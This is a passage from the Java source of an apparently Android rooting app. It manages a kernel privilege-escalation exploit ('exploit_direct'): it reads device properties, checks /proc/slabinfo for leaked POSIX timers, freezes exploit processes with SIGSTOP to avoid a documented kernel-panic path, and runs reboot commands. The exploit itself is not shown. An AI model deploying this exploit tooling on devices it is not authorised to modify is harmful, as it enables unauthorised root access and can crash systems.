                stageDone = true;
                break;
            }
            sleepMs(2000L);
        }
        String note = stageDone ? "(root_stage already completed by worker)" : "(worker did not complete root_stage)";
        String rootId = Shell.exec("cat " + WORK + "/root_id.txt 2>/dev/null");
        return note + " | root_id=" + (rootId == null ? "" : rootId.trim());
    }

    /** Device info for the home page: {model, kernel, android, sdk, fingerprint, selinux} */
    public static String[] readDeviceInfo() {
        String model = Shell.exec("getprop ro.product.model").trim();
        String kernel = Shell.exec("uname -r").trim();
        String rel = Shell.exec("getprop ro.build.version.release").trim();
        String sdk = Shell.exec("getprop ro.build.version.sdk").trim();
        String fp = Shell.exec("getprop ro.build.fingerprint").trim();
        String se = Shell.exec("getenforce").trim();
        return new String[]{model, kernel, rel, sdk, fp, se};
    }

    public static boolean managerInstalled(Context ctx, RootManager m) {
        return RootManager.installed(ctx, m);
    }

    /** 当前管理器显示名（未提权时显示选中的） */
    private volatile int workerChildPid = 0;

    /**
     * 检测内核残留（POSIX timer / 旧 exploit 进程）。有残留时挂起引擎并弹液态玻璃
     * 弹窗，由用户选择：继续执行 / 取消执行 / 重启手机（重启走 Stellar shell）。
     * 无残留则直接继续。
     */
    private boolean checkResidueAndAsk() {
        int active = -1;
        try {
            String slab = Shell.exec("grep ^posix_timers_cache /proc/slabinfo 2>/dev/null").trim();
            String[] parts = slab.split("\\s+");
            if (parts.length >= 2) {
                active = Integer.parseInt(parts[1]);
            }
        } catch (Throwable ignored) {
        }
        int frozen = 0;
        String pids = Shell.exec("pidof exploit_direct 2>/dev/null").trim();
        if (!pids.isEmpty()) {
            frozen = pids.split("\\s+").length;
        }
        this.log("POSIX timer 残留=" + (active < 0 ? "未知" : String.valueOf(active))
                + "，旧 exploit 进程=" + frozen);
        if (active <= 8000 && frozen == 0) {
            return true;
        }
        this.log("⚠ 内核有上次运行残留：本轮竞态可能偏慢、panic 风险略高");
        this.residueDecision = RESIDUE_PENDING;
        this.setStatus(ST_RUN, "等待确认");
        final int timerActive = active;
        final int exploitCount = frozen;
        this.ui.post(() -> this.listener.onResidueWarning(timerActive, exploitCount));
        synchronized (this.residueLock) {
            while (this.residueDecision == RESIDUE_PENDING) {
                try {
                    this.residueLock.wait();
                } catch (InterruptedException e) {
                    this.residueDecision = RESIDUE_CANCEL;
                }
            }
        }
        int decision = this.residueDecision;
        if (decision == RESIDUE_CONTINUE) {
            this.log("用户选择：继续执行（内核残留状态下）");
            this.setStatus(ST_RUN, "执行中");
            return true;
        }
        if (decision == RESIDUE_REBOOT) {
            this.log("用户选择：重启手机 ...");
            this.setStatus(ST_RUN, "正在重启");
            // 多级兜底：svc → reboot → setprop sys.powerctl。
            // 显式补全 PATH/ANDROID_* 环境变量（Stellar 的 shell 环境可能比 adb shell 精简）。
            String cmd = "export PATH=/sbin:/system/sbin:/system/bin:/system/xbin:/system_ext/bin;"
                    + " export ANDROID_ROOT=/system ANDROID_DATA=/data ANDROID_STORAGE=/storage;"
                    + " /system/bin/svc power reboot 2>&1; echo SVC_RC=$?;"
                    + " sleep 1; /system/bin/reboot 2>&1; echo REBOOT_RC=$?;"
                    + " sleep 1; setprop sys.powerctl reboot 2>&1; echo PROP_RC=$?; true";
            String out = Shell.exec(cmd);
            String text = out == null ? "" : out.trim();
            this.log("reboot: " + text);
            sleepMs(6000L);
            this.log("⚠ 若设备仍未重启：请手动重启手机后再执行（自动重启已尝试 svc/reboot/powerctl）");
            this.setStatus(ST_FAIL, "请手动重启");
            return false;
        }
        this.log("用户选择：取消执行");
        this.setStatus(ST_FAIL, "已取消");
        return false;
    }

    /**
     * Freeze (SIGSTOP) exploit processes instead of killing them.
     *
     * The exploit leaks POSIX timers and its process-exit path is a known panic
     * vector (posix_cpu_timers_exit_group -> rb_next).  The validated harness
     * therefore always SIGSTOPs and lets the next reboot clear the frozen
     * processes.  We follow the same policy for every stage transition.
     */
    private void freezeExploits() {
        Shell.exec("kill -STOP $(pidof exploit_direct) 2>/dev/null");
    }

    public static void sleepMs(long ms) {
        try {
            Thread.sleep(ms);
        } catch (InterruptedException ignored) {
        }
    }
}
